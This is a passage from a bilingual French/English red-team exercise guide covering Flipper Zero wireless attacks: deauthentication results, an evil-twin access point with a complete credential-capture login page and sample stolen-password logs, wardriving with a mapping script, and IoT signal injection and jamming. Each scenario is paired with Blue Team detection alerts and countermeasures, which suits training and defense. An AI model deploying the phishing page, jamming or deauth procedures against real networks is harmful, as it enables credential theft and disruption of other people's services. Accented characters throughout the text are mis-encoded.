<span class="nx">Source</span><span class="p">:</span><span class="w"> </span><span class="nx">AP_BSSID</span><span class="w"> </span><span class="p">(</span><span class="nx">AA</span><span class="p">:</span><span class="nx">BB</span><span class="p">:</span><span class="nx">CC</span><span class="p">:</span><span class="nx">DD</span><span class="p">:</span><span class="nx">EE</span><span class="p">:</span><span class="nx">FF</span><span class="p">)</span>
<span class="nx">Reason</span><span class="p">:</span><span class="w"> </span><span class="nx">Unspecified</span><span class="w"> </span><span class="nx">reason</span><span class="w"> </span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
</code></pre></div>

<p><strong>R√©sultats Attendus / Expected Results</strong>
- D√©connexion massive des clients WiFi
- Impossibilit√© de se reconnecter
- Perturbation des services r√©seau
- Plaintes utilisateurs</p>
<p><strong>M√©triques de succ√®s / Success Metrics</strong>
- Clients d√©connect√©s : 23/23 (100%)
- Tentatives de reconnexion : 156 √©checs
- Dur√©e de l'attaque : 5 minutes
- Trafic g√©n√©r√© : 30,000 frames deauth/min</p>
<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Alertes IDS/IPS :</em></p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">ALERT</span><span class="o">]</span><span class="w"> </span><span class="n">Deauth</span><span class="w"> </span><span class="n">flood</span><span class="w"> </span><span class="n">detected</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">Corp</span><span class="o">-</span><span class="n">WiFi</span>
<span class="nl">Source</span><span class="p">:</span><span class="w"> </span><span class="n">Multiple</span><span class="w"> </span><span class="k">unknown</span><span class="w"> </span><span class="n">MAC</span><span class="w"> </span><span class="n">addresses</span>
<span class="nl">Rate</span><span class="p">:</span><span class="w"> </span><span class="mi">500</span><span class="w"> </span><span class="n">deauth</span><span class="w"> </span><span class="n">frames</span><span class="o">/</span><span class="k">second</span>
<span class="nl">Duration</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">minutes</span><span class="w"> </span><span class="n">continuous</span>
<span class="n">Affected</span><span class="w"> </span><span class="nl">clients</span><span class="p">:</span><span class="w"> </span><span class="mi">23</span>
</code></pre></div>

<p><em>Contre-mesures imm√©diates :</em>
- Activation du filtrage MAC
- Changement de canal WiFi
- Activation de la protection 802.11w (PMF)
- Investigation de l'origine de l'attaque</p>
<h4 id="scenario-3-point-dacces-malveillant-evil-twin">üî¥ Sc√©nario 3 : Point d'Acc√®s Malveillant (Evil Twin)</h4>
<h3 id="malicious-access-point-evil-twin">Malicious Access Point (Evil Twin)</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Cr√©ation d'un faux point d'acc√®s pour capturer les identifiants des employ√©s. </p>
<p><strong>English :</strong> Creating a rogue access point to capture employee credentials.</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Clonage du r√©seau l√©gitime</em></p>
<div class="codehilite"><pre><span></span><code>WiFi<span class="w"> </span>Scanner<span class="w"> </span>‚Üí<span class="w"> </span>Identifier<span class="w"> </span><span class="s2">&quot;Corp-WiFi&quot;</span>
-<span class="w"> </span>SSID:<span class="w"> </span>Corp-WiFi
-<span class="w"> </span>S√©curit√©:<span class="w"> </span>WPA2-PSK
-<span class="w"> </span>Canal:<span class="w"> </span><span class="m">6</span>
-<span class="w"> </span>Signal:<span class="w"> </span>-45<span class="w"> </span>dBm
</code></pre></div>

<p><em>Phase 2 : Configuration de l'Evil Twin</em></p>
<div class="codehilite"><pre><span></span><code>WiFi<span class="w"> </span>‚Üí<span class="w"> </span>Evil<span class="w"> </span>Portal
-<span class="w"> </span>SSID:<span class="w"> </span>Corp-WiFi<span class="w"> </span><span class="o">(</span>identique<span class="o">)</span>
-<span class="w"> </span>Security:<span class="w"> </span>Open<span class="w"> </span><span class="o">(</span>pour<span class="w"> </span>faciliter<span class="w"> </span>la<span class="w"> </span>connexion<span class="o">)</span>
-<span class="w"> </span>Channel:<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="o">(</span>diff√©rent<span class="w"> </span>pour<span class="w"> </span>√©viter<span class="w"> </span>l<span class="err">&#39;</span>interf√©rence<span class="o">)</span>
-<span class="w"> </span>Captive<span class="w"> </span>Portal:<span class="w"> </span>Activ√©
-<span class="w"> </span>DNS<span class="w"> </span>Spoofing:<span class="w"> </span>Activ√©
</code></pre></div>

<p><em>Phase 3 : Cr√©ation de la page de capture</em></p>
<div class="codehilite"><pre><span></span><code><span class="cm">&lt;!-- Page de capture d&#39;identifiants --&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Corp-WiFi - Authentification<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="w">        </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">font-family</span><span class="p">:</span><span class="w"> </span><span class="n">Arial</span><span class="p">;</span><span class="w"> </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="mh">#f0f0f0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">.</span><span class="nc">login-box</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
<span class="w">            </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">300</span><span class="kt">px</span><span class="p">;</span><span class="w"> </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">px</span><span class="w"> </span><span class="kc">auto</span><span class="p">;</span><span class="w"> </span>
<span class="w">            </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="kc">white</span><span class="p">;</span><span class="w"> </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="w">            </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span><span class="w"> </span><span class="k">box-shadow</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mh">#ccc</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">input</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span><span class="w"> </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span><span class="w"> </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="nt">button</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="mh">#007acc</span><span class="p">;</span><span class="w"> </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="kc">white</span><span class="p">;</span><span class="w"> </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;login-box&quot;</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Connexion Corp-WiFi<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/capture.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Nom d&#39;utilisateur&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Mot de passe&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>Se connecter<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;</span>Syst√®me de s√©curit√© mis √† jour. Veuillez vous reconnecter.<span class="p">&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<p><em>Phase 4 : Positionnement et attente</em></p>
<div class="codehilite"><pre><span></span><code>-<span class="w"> </span>Se<span class="w"> </span>positionner<span class="w"> </span>dans<span class="w"> </span>la<span class="w"> </span>caf√©t√©ria<span class="w"> </span>ou<span class="w"> </span>hall<span class="w"> </span>d<span class="s1">&#39;entr√©e</span>
<span class="s1">- Activer l&#39;</span>Evil<span class="w"> </span>Twin<span class="w"> </span>AP
-<span class="w"> </span>Attendre<span class="w"> </span>les<span class="w"> </span>connexions<span class="w"> </span>automatiques
-<span class="w"> </span>Logger<span class="w"> </span>toutes<span class="w"> </span>les<span class="w"> </span>tentatives<span class="w"> </span>d<span class="err">&#39;</span>authentification
</code></pre></div>

<p><strong>R√©sultats Attendus / Expected Results</strong></p>
<p><em>Capture d'identifiants :</em></p>
<div class="codehilite"><pre><span></span><code>[14:30:15] New connection: iPhone-John (aa:bb:cc:dd:ee:ff)
[14:30:22] Credentials captured:
           Username: john.doe
           Password: Summer2024!
           Device: iPhone-John
           Location: Cafeteria

[14:35:42] New connection: LAPTOP-MARIE (11:22:33:44:55:66)
[14:35:51] Credentials captured:
           Username: marie.martin
           Password: MotDePasse123
           Device: Windows 10
           Location: Cafeteria
</code></pre></div>

<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Indicateurs WIDS (Wireless Intrusion Detection System) :</em></p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">ALERT</span><span class="o">]</span><span class="w"> </span><span class="n">Rogue</span><span class="w"> </span><span class="n">AP</span><span class="w"> </span><span class="n">detected</span>
<span class="nl">SSID</span><span class="p">:</span><span class="w"> </span><span class="n">Corp</span><span class="o">-</span><span class="n">WiFi</span><span class="w"> </span><span class="p">(</span><span class="n">duplicate</span><span class="p">)</span>
<span class="nl">BSSID</span><span class="p">:</span><span class="w"> </span><span class="nl">BB</span><span class="p">:</span><span class="nl">BB</span><span class="p">:</span><span class="nl">CC</span><span class="p">:</span><span class="nl">DD</span><span class="p">:</span><span class="nl">EE</span><span class="p">:</span><span class="n">FF</span><span class="w"> </span><span class="p">(</span><span class="k">unknown</span><span class="p">)</span>
<span class="nl">Channel</span><span class="p">:</span><span class="w"> </span><span class="mi">11</span>
<span class="n">Signal</span><span class="w"> </span><span class="nl">Strength</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">35</span><span class="w"> </span><span class="n">dBm</span>
<span class="nl">Location</span><span class="p">:</span><span class="w"> </span><span class="n">Estimated</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="nf">Floor</span><span class="w"> </span><span class="mi">1</span>
<span class="n">Risk</span><span class="w"> </span><span class="k">Level</span><span class="err">:</span><span class="w"> </span><span class="n">CRITICAL</span>
</code></pre></div>

<p><em>Actions de r√©ponse :</em>
- Alerte imm√©diate au SOC
- Triangulation de la position du rogue AP
- Notification aux utilisateurs (email/SMS)
- Envoi d'une √©quipe de s√©curit√© physique
- Blocage MAC address sur l'infrastructure</p>
<h4 id="scenario-4-reconnaissance-avancee-wardriving-gps">üî¥ Sc√©nario 4 : Reconnaissance Avanc√©e (Wardriving + GPS)</h4>
<h3 id="advanced-reconnaissance-wardriving-gps">Advanced Reconnaissance (Wardriving + GPS)</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Cartographie d√©taill√©e des r√©seaux WiFi expos√©s autour du p√©rim√®tre de l'entreprise. </p>
<p><strong>English :</strong> Detailed mapping of exposed WiFi networks around the company perimeter.</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Pr√©paration de la mission</em></p>
<div class="codehilite"><pre><span></span><code>Mat√©riel<span class="w"> </span>requis:
-<span class="w"> </span>Flipper<span class="w"> </span>Zero<span class="w"> </span>+<span class="w"> </span>Module<span class="w"> </span>Predator
-<span class="w"> </span>Antenne<span class="w"> </span>WiFi<span class="w"> </span>haute<span class="w"> </span>sensibilit√©
-<span class="w"> </span>Antenne<span class="w"> </span>GPS
-<span class="w"> </span>V√©hicule<span class="w"> </span>avec<span class="w"> </span>support<span class="w"> </span>smartphone
-<span class="w"> </span>Batterie<span class="w"> </span>externe
-<span class="w"> </span>Smartphone<span class="w"> </span>avec<span class="w"> </span>Google<span class="w"> </span>Maps
</code></pre></div>

<p><em>Phase 2 : Configuration du Wardriving</em></p>
<div class="codehilite"><pre><span></span><code>GPS<span class="w"> </span>‚Üí<span class="w"> </span>Activate<span class="w"> </span>GPS<span class="w"> </span>Module
-<span class="w"> </span>Attendre<span class="w"> </span>la<span class="w"> </span>synchronisation<span class="w"> </span>satellite<span class="w"> </span><span class="o">(</span><span class="m">30</span>-60s<span class="o">)</span>
-<span class="w"> </span>V√©rifier<span class="w"> </span>la<span class="w"> </span>pr√©cision<span class="w"> </span><span class="o">(</span>&lt;5m<span class="o">)</span>

WiFi<span class="w"> </span>‚Üí<span class="w"> </span>Wardriving<span class="w"> </span>Mode
-<span class="w"> </span>Scan<span class="w"> </span>Interval:<span class="w"> </span><span class="m">5</span><span class="w"> </span>secondes
-<span class="w"> </span>GPS<span class="w"> </span>Logging:<span class="w"> </span>Activ√©
-<span class="w"> </span>Output<span class="w"> </span>Format:<span class="w"> </span>CSV<span class="w"> </span>+<span class="w"> </span>KML
-<span class="w"> </span>Storage:<span class="w"> </span>SD<span class="w"> </span>Card
</code></pre></div>

<p><em>Phase 3 : Parcours de reconnaissance</em></p>
<p>Route planifi√©e:
- Point A: Parking public (200m de l'entreprise)
- Point B: Rue adjacente nord
- Point C: Rue adjacente est<br />
- Point D: Rue adjacente sud
- Point E: Rue adjacente ouest
- Vitesse: 20-30 km/h pour capture optimale</p>
<p><em>Phase 4 : Collecte de donn√©es</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Exemple de log wardriving</span>
Time,Latitude,Longitude,SSID,BSSID,Security,Signal,Channel
<span class="m">14</span>:23:15,46.2044,6.1432,Corp-WiFi,AA:BB:CC:DD:EE:FF,WPA2,-42,6
<span class="m">14</span>:23:16,46.2044,6.1433,Corp-Guest,AA:BB:CC:DD:EE:F1,Open,-45,6
<span class="m">14</span>:23:17,46.2045,6.1434,PRINTER-HP-001,BB:CC:DD:EE:FF:11,Open,-38,11
<span class="m">14</span>:23:18,46.2045,6.1435,Corp-IoT,CC:DD:EE:FF:11:22,WEP,-41,1
<span class="m">14</span>:23:19,46.2046,6.1436,CCTV-System,DD:EE:FF:11:22:33,Open,-39,6
</code></pre></div>

<p><strong>Analyse des Donn√©es / Data Analysis</strong></p>
<p><em>Phase 5 : Post-traitement</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Conversion et analyse</span>
python3<span class="w"> </span>wardriving_analyzer.py<span class="w"> </span>--input<span class="w"> </span>wardriving_log.csv
</code></pre></div>

<p><em>Script d'analyse exemple :</em></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
<span class="kn">import</span> <span class="nn">folium</span>
<span class="kn">from</span> <span class="nn">geopy.distance</span> <span class="kn">import</span> <span class="n">geodesic</span>

<span class="k">def</span> <span class="nf">analyze_wardriving_data</span><span class="p">(</span><span class="n">csv_file</span><span class="p">):</span>
    <span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="n">csv_file</span><span class="p">)</span>

    <span class="c1"># Analyse statistique</span>
    <span class="n">total_networks</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">df</span><span class="p">)</span>
    <span class="n">open_networks</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;Security&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;Open&#39;</span><span class="p">])</span>
    <span class="n">wep_networks</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;Security&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;WEP&#39;</span><span class="p">])</span>
    <span class="n">corporate_networks</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;SSID&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">str</span><span class="o">.</span><span class="n">contains</span><span class="p">(</span><span class="s1">&#39;Corp&#39;</span><span class="p">)])</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;=== RAPPORT WARDRIVING ===&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;R√©seaux d√©tect√©s: </span><span class="si">{</span><span class="n">total_networks</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;R√©seaux ouverts: </span><span class="si">{</span><span class="n">open_networks</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">open_networks</span><span class="o">/</span><span class="n">total_networks</span><span class="o">*</span><span class="mi">100</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2">%)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;R√©seaux WEP: </span><span class="si">{</span><span class="n">wep_networks</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">wep_networks</span><span class="o">/</span><span class="n">total_networks</span><span class="o">*</span><span class="mi">100</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2">%)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;R√©seaux corporate expos√©s: </span><span class="si">{</span><span class="n">corporate_networks</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="c1"># Carte de heat map</span>
    <span class="n">map_center</span> <span class="o">=</span> <span class="p">[</span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;Latitude&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">mean</span><span class="p">(),</span> <span class="n">df</span><span class="p">[</span><span class="s1">&#39;Longitude&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">mean</span><span class="p">()]</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">folium</span><span class="o">.</span><span class="n">Map</span><span class="p">(</span><span class="n">location</span><span class="o">=</span><span class="n">map_center</span><span class="p">,</span> <span class="n">zoom_start</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">df</span><span class="o">.</span><span class="n">iterrows</span><span class="p">():</span>
        <span class="n">color</span> <span class="o">=</span> <span class="s1">&#39;red&#39;</span> <span class="k">if</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;Security&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;Open&#39;</span> <span class="k">else</span> <span class="s1">&#39;orange&#39;</span> <span class="k">if</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;Security&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;WEP&#39;</span> <span class="k">else</span> <span class="s1">&#39;green&#39;</span>
        <span class="n">folium</span><span class="o">.</span><span class="n">CircleMarker</span><span class="p">(</span>
            <span class="n">location</span><span class="o">=</span><span class="p">[</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;Latitude&#39;</span><span class="p">],</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;Longitude&#39;</span><span class="p">]],</span>
            <span class="n">radius</span><span class="o">=</span><span class="nb">abs</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;Signal&#39;</span><span class="p">])</span><span class="o">/</span><span class="mi">10</span><span class="p">),</span>
            <span class="n">popup</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;SSID&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;Security&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">,</span>
            <span class="n">color</span><span class="o">=</span><span class="n">color</span><span class="p">,</span>
            <span class="n">fill</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span><span class="o">.</span><span class="n">add_to</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>

    <span class="n">m</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;wardriving_heatmap.html&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">df</span>

<span class="c1"># Utilisation</span>
<span class="n">results</span> <span class="o">=</span> <span class="n">analyze_wardriving_data</span><span class="p">(</span><span class="s1">&#39;wardriving_log.csv&#39;</span><span class="p">)</span>
</code></pre></div>

<p><strong>R√©sultats Attendus / Expected Results</strong></p>
<p><em>D√©couvertes critiques :</em></p>
<div class="codehilite"><pre><span></span><code>=== RAPPORT WARDRIVING - ENTREPRISE XYZ ===

üìä Statistiques g√©n√©rales:
- Total r√©seaux d√©tect√©s: 47
- R√©seaux ouverts: 12 (25.5%)
- R√©seaux WEP: 3 (6.4%)
- R√©seaux corporate expos√©s: 8 (17.0%)

üî® Vuln√©rabilit√©s identifi√©es:
- Corp-Guest (Open) - Visible depuis parking public
- PRINTER-HP-001 (Open) - Imprimante non s√©curis√©e
- Corp-IoT (WEP) - Chiffrement obsol√®te
- CCTV-System (Open) - Cam√©ras accessibles
- Corp-WiFi - Signal d√©borde de 150m hors p√©rim√®tre

üìç Zones √† risque:
- Parking public: 8 r√©seaux corporate visibles
- Rue nord: Signal Corp-WiFi √† -35 dBm
- Caf√© en face: Connexion possible au r√©seau invit√©
</code></pre></div>

<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Surveillance p√©rim√©trique :</em>
- D√©tection de v√©hicules suspects dans le p√©rim√®tre
- Monitoring des tentatives de connexion depuis l'ext√©rieur
- Analyse des logs de g√©olocalisation des connexions WiFi</p>
<h4 id="scenario-5-attaque-sur-objets-connectes-iot">üî¥ Sc√©nario 5 : Attaque sur Objets Connect√©s (IoT)</h4>
<h3 id="iot-device-attack">IoT Device Attack</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Compromission d'appareils IoT d'entreprise via leurs interfaces radio. </p>
<p><strong>English :</strong> Compromising corporate IoT devices via their radio interfaces.</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Reconnaissance IoT</em></p>
<div class="codehilite"><pre><span></span><code>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Read<span class="w"> </span>‚Üí<span class="w"> </span>Frequency<span class="w"> </span>Analyzer
-<span class="w"> </span>Scan<span class="w"> </span><span class="m">315</span><span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>capteurs<span class="w"> </span>US<span class="o">)</span>
-<span class="w"> </span>Scan<span class="w"> </span><span class="m">433</span>.92<span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>capteurs<span class="w"> </span>EU<span class="o">)</span>
-<span class="w"> </span>Scan<span class="w"> </span><span class="m">868</span><span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>LoRaWAN<span class="o">)</span>
-<span class="w"> </span>Scan<span class="w"> </span><span class="m">915</span><span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>capteurs<span class="w"> </span>industriels<span class="o">)</span>
</code></pre></div>

<p><em>D√©couvertes typiques :</em></p>
<p>Fr√©quence 433.92 MHz:
- Capteurs de temp√©rature (bureaux)
- Badges RFID longue port√©e
- Syst√®me d'arrosage automatique
- Capteurs d'ouverture (portes/fen√™tres)</p>
<p>Fr√©quence 868 MHz:
- Compteurs intelligents
- Capteurs de qualit√© d'air
- Syst√®me de chauffage connect√©</p>
<p><em>Phase 2 : Analyse de protocole</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Capture d&#39;un capteur de temp√©rature</span>
Signal:<span class="w"> </span><span class="m">433</span>.920<span class="w"> </span>MHz
Modulation:<span class="w"> </span>FSK
D√©bit:<span class="w"> </span><span class="m">2400</span><span class="w"> </span>baud
Trame:<span class="w"> </span><span class="o">[</span>SYNC<span class="o">][</span>ID<span class="o">][</span>TEMP<span class="o">][</span>HUMID<span class="o">][</span>CRC<span class="o">]</span>

Exemple<span class="w"> </span>de<span class="w"> </span>donn√©es<span class="w"> </span>d√©cod√©es:
ID<span class="w"> </span>Capteur:<span class="w"> </span>0x2A4F
Temp√©rature:<span class="w"> </span><span class="m">23</span>.5¬∞C
Humidit√©:<span class="w"> </span><span class="m">45</span>%
Batterie:<span class="w"> </span><span class="m">85</span>%
</code></pre></div>

<p><em>Phase 3 : Attaques sp√©cifiques</em></p>
<p>A) Injection de donn√©es falsifi√©es</p>
<div class="codehilite"><pre><span></span><code>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Send<span class="w"> </span>‚Üí<span class="w"> </span>Custom<span class="w"> </span>Signal
-<span class="w"> </span>Modifier<span class="w"> </span>la<span class="w"> </span>temp√©rature:<span class="w"> </span><span class="m">50</span>¬∞C
-<span class="w"> </span>D√©clencher<span class="w"> </span>une<span class="w"> </span>alerte<span class="w"> </span>syst√®me
-<span class="w"> </span>Observer<span class="w"> </span>la<span class="w"> </span>r√©action<span class="w"> </span>des<span class="w"> </span>√©quipes
</code></pre></div>

<p>B) D√©ni de service par brouillage</p>
<div class="codehilite"><pre><span></span><code>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Jammer<span class="w"> </span>Mode
-<span class="w"> </span>Fr√©quence<span class="w"> </span>cible:<span class="w"> </span><span class="m">433</span>.92<span class="w"> </span>MHz
-<span class="w"> </span>Puissance:<span class="w"> </span>Maximum
-<span class="w"> </span>Dur√©e:<span class="w"> </span><span class="m">30</span><span class="w"> </span>minutes
-<span class="w"> </span>Impact:<span class="w"> </span>Perte<span class="w"> </span>de<span class="w"> </span>donn√©es<span class="w"> </span>capteurs
</code></pre></div>

<p><strong>R√©sultats Attendus / Expected Results</strong>
- Fausses alertes sur les syst√®mes de monitoring
- Interruption de la collecte de donn√©es IoT
- Confusion dans les √©quipes de maintenance
- Possibilit√© d'acc√®s physique (capteurs d'ouverture)</p>
<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Alertes syst√®me :</em></p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">CRITICAL</span><span class="o">]</span><span class="w"> </span><span class="n">Temperature</span><span class="w"> </span><span class="n">anomaly</span><span class="w"> </span><span class="n">detected</span>
<span class="nl">Sensor</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="n">A4F</span><span class="w"> </span><span class="p">(</span><span class="n">Conference</span><span class="w"> </span><span class="n">Room</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span>
<span class="k">Value</span><span class="err">:</span><span class="w"> </span><span class="mf">50.0</span><span class="err">¬∞</span><span class="n">C</span><span class="w"> </span><span class="p">(</span><span class="n">outside</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="k">range</span><span class="err">:</span><span class="w"> </span><span class="mi">18</span><span class="o">-</span><span class="mi">28</span><span class="err">¬∞</span><span class="n">C</span><span class="p">)</span>
